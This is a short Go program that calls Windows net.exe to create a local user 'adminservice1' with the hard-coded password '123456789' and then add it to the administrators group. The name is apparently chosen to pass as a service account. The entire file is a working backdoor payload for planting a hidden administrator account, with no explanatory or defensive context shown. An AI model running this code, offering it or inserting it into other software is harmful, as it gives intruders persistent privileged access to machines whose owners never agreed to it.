package main

import (
	"log"
	"os/exec"
)

func main() {
	const username = "adminservice1"
	const password = "123456789"

	//First create the user
	cmd1 := exec.Command("net.exe", "user", username, password, "/add")
	err1 := cmd1.Run()

	if err1 != nil {
		log.Fatal(err1)
	}

	//Second add the user to the local admins group
	cmd2 := exec.Command("net.exe", "localgroup", "administrators", username, "/add")
	err2 := cmd2.Run()

	if err2 != nil {
		log.Fatal(err2)
	}
}
